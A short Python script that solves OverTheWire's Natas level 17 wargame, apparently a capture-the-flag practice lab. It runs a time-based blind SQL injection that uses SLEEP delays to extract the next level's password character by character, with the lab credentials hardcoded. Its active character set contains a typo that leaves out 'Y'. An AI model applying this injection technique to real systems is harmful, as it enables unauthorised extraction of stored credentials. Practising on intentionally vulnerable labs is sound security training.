# import requests
# from requests.auth import HTTPBasicAuth

# Auth=HTTPBasicAuth('natas17', 'XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd')
# headers = {'content-type': 'application/x-www-form-urlencoded'}
# filteredchars = 'agknoquvwxBDEFGJLNPQUVZ468'
# passwd = '8NqogvoQuaaoggU6wPaakUqBBGn6g'
# allchars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'

# # for char in allchars:
# #         payload = 'username=natas18%22+and+password+like+binary+%27%25{0}%25%27+and+sleep%281%29+%23'.format(char)
# #         r = requests.post('http://natas17.natas.labs.overthewire.org/index.php', auth=Auth, data=payload, headers=headers)
# #         if(r.elapsed.seconds >= 1):
# #                 filteredchars = filteredchars + char
# #                 print(filteredchars)

# # print(filteredchars)

# for i in range(0,34):
#         print(i)
#         for char in filteredchars:
#                 payload = 'username=natas18%22%20and%20password%20like%20binary%20\'{0}%25\'%20and%20sleep(1)%23'.format(passwd + char)
#                 r = requests.post('http://natas17.natas.labs.overthewire.org/index.php', auth=Auth, data=payload, headers=headers)
#                 if(r.elapsed.seconds >= 1):
#                         passwd = passwd + char
#                         print(passwd)
#                         break

import requests
url='http://natas17:XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd@natas17.natas.labs.overthewire.org/'

passchar='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXVZ1234567890'
bstr='blasts'.encode('utf-8')
password=''

for i in range(32):
	for j in passchar:
		req = requests.get(url+'?username=natas18" AND password LIKE BINARY"' + password + j + '%" AND SLEEP(10) -- -')

		if req.elapsed.total_seconds() >= 10:
			password = password+j
			print('Password: ' + password)
			break